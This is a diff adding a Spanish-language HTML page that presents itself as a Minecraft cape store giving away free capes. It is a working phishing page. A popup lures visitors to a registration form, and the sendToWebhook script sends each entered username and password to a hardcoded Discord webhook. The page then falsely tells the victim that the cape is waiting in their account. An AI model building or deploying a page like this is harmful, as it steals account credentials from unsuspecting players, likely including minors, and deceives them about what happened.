@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Venta de Capas de Minecraft</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #1a1a1a, #333);
+            color: white;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .header {
+            background: linear-gradient(45deg, #ff0000, #ff7300, #ffeb00, #00ff00, #008cff, #7a00ff);
+            padding: 15px;
+            font-size: 28px;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
+        }
+        .header button {
+            background: white;
+            color: black;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        .header button:hover {
+            background: #ffeb00;
+        }
+        .container {
+            max-width: 1100px;
+            margin: auto;
+            padding: 30px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+        }
+        .cape {
+            background: #444;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.2);
+            width: 250px;
+            text-align: center;
+        }
+        .cape img {
+            width: 100%;
+            border-radius: 5px;
+        }
+        .free-button {
+            background: #00ff00;
+            color: black;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .free-button:hover {
+            background: #00cc00;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.3);
+            width: 300px;
+        }
+        .popup input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+        }
+    </style>
+    <script>
+        function toggleRegister() {
+            document.getElementById('register-popup').style.display = 'block';
+        }
+        function closePopup(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+        window.onload = function() {
+            document.getElementById('free-popup').style.display = 'block';
+        }
+        function sendToWebhook(event) {
+            event.preventDefault();
+            let user = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+            
+            fetch("https://discord.com/api/webhooks/1345453878463692870/CrHLHW2Zx8RVCg6O8g_AqJq87bbMyLLXpckTcDUrlLR4jqo2L_eQ527F7kPqvpVwt1KQ", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `Nuevo registro: Usuario: ${user}, Contraseña: ${password}` })
+            });
+            
+            closePopup('register-popup');
+            document.getElementById('success-popup').style.display = 'block';
+        }
+    </script>
+</head>
+<body>
+    <div class="header">
+        <span>Tienda de Capas de Minecraft</span>
+        <button onclick="toggleRegister()">Register</button>
+    </div>
+    
+    <div id="free-popup" class="popup">
+        <h2>¡Llévate una capa gratis!</h2>
+        <button class="free-button" onclick="toggleRegister(); closePopup('free-popup');">Conseguir ahora</button>
+    </div>
+    
+    <div id="register-popup" class="popup">
+        <h2>Registro</h2>
+        <form onsubmit="sendToWebhook(event)">
+            <input id="username" type="text" placeholder="Usuario" required>
+            <input id="password" type="password" placeholder="Contraseña" required>
+            <button type="submit" class="free-button">Registrarse</button>
+        </form>
+        <button onclick="closePopup('register-popup')">Cerrar</button>
+    </div>
+    
+    <div id="success-popup" class="popup">
+        <h2>LA CAPA YA ESTÁ ESPERANDO EN TU CUENTA...</h2>
+        <button onclick="closePopup('success-popup')">Cerrar</button>
+    </div>
+    
+    <div class="container">
+        <div class="cape">
+            <img src="capa1.png" alt="Capa Gratis">
+            <p>FREE</p>
+            <button class="free-button" onclick="toggleRegister()">FREE</button>
+        </div>
+        <div class="cape">
+            <img src="capa2.png" alt="Capa Gratis">
+            <p>FREE</p>
+            <button class="free-button" onclick="toggleRegister()">FREE</button>
+        </div>
+        <div class="cape">
+            <img src="capa3.png" alt="Capa Gratis">
+            <p>FREE</p>
+            <button class="free-button" onclick="toggleRegister()">FREE</button>
+        </div>
+    </div>
+</body>
+</html>
